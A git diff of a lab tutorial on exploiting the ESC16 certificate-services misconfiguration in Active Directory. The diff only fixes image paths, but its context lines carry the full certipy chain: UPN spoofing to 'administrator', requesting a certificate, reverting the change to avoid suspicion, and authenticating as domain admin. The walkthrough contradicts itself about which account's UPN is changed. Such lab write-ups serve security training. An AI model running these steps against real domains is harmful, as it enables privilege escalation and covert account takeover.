@@ -78,7 +78,7 @@ net stop certsvc
 net start certsvc
 ```
 
-<img src="assets/adcs-esc16/image1.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image1.png" alt="Error loading image">
 
 Sets KDC to not enforce strong binding between certificates and accounts, which is required to exploit ESC16.
 
@@ -97,7 +97,7 @@ Restarts the KDC service to apply the updated binding enforcement setting.
 ```
 Restart-Service kdc
 ```
-<img src="assets/adcs-esc16/image2.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image2.png" alt="Error loading image">
 
 To exploit ESC16, the user `jcharles` needs permission to modify the `userPrincipalName` (UPN) of another user, such as `martin`. By default, this is not allowed, and you'll see an error when trying to update it.
 
@@ -110,7 +110,7 @@ Grant jcharles `Write` permission on `martin`.
 
 This simulates a misconfiguration where a low-privileged user has improper write access to another user’s attributes — sufficient to exploit ESC16.
 
-<img src="assets/adcs-esc16/image3.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image3.png" alt="Error loading image">
 
 ## Enumerating AD CS for ESC16 Vulnerability
 
@@ -120,7 +120,7 @@ To identify whether the Active Directory Certificate Services (AD CS) environmen
 certipy find -u 'jcharles' -p 'complex1@' -dc-ip 192.168.129.140 -stdout -vulnerable
 ```
 
-<img src="assets/adcs-esc16/image4.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image4.png" alt="Error loading image">
 
 The output confirms the **ESC16 vulnerability**, indicating the extension `1.3.6.1.4.1.311.25.2` is disabled, which weakens the binding between certificates and user accounts — a prerequisite for abusing ESC16.
 
@@ -135,7 +135,7 @@ Using the credentials of user jcharles, we update martin userPrincipalName to im
 certipy account -u 'jcharles' -p 'complex1@' -target 'furious.local' -upn 'administrator' -user 'martin' update
 ```
 
-<img src="assets/adcs-esc16/image5.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image5.png" alt="Error loading image">
 
 - his modifies the userPrincipalName attribute for jcharles to administrator.
 - Allows jcharles to request certificates for the administrator identity.
@@ -146,7 +146,7 @@ Step 2: Verify the Attribute Update
 certipy account -u 'jcharles' -p 'complex1@' -dc-ip 192.168.129.140 -user 'jcharles' read
 ```
 
-<img src="assets/adcs-esc16/image6.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image6.png" alt="Error loading image">
 
 Confirms userPrincipalName is now set to administrator.
 
@@ -156,7 +156,7 @@ Step 3: Request Certificate as administrator
 certipy req -dc-ip '192.168.129.140' -u 'administrator' -p 'complex1@' -target 'furious.local' -ca 'furious-DC01-FURIOUS5-CA' -template 'User'
 ```
 
-<img src="assets/adcs-esc16/image7.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image7.png" alt="Error loading image">
 
 Step 4: Revert the UPN Change
 
@@ -164,7 +164,7 @@ Step 4: Revert the UPN Change
 certipy account -u 'jcharles' -p 'complex1@' -target 'furious.local' -upn 'charles' -user 'jcharles' update
 ```
 
-<img src="assets/adcs-esc16/image8.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image8.png" alt="Error loading image">
 
 Reverts userPrincipalName back to prevent suspicion or disruption.
 
@@ -175,7 +175,7 @@ Step 5: Authenticate Using the Stolen Certificate
 certipy auth -pfx administrator.pfx -domain furious.local -dc-ip 192.168.129.140
 ```
 
-<img src="assets/adcs-esc16/image9.png" alt="Error loading image">
+<img src="/assets/adcs-esc16/image9.png" alt="Error loading image">
 
 ### Conclusion
 
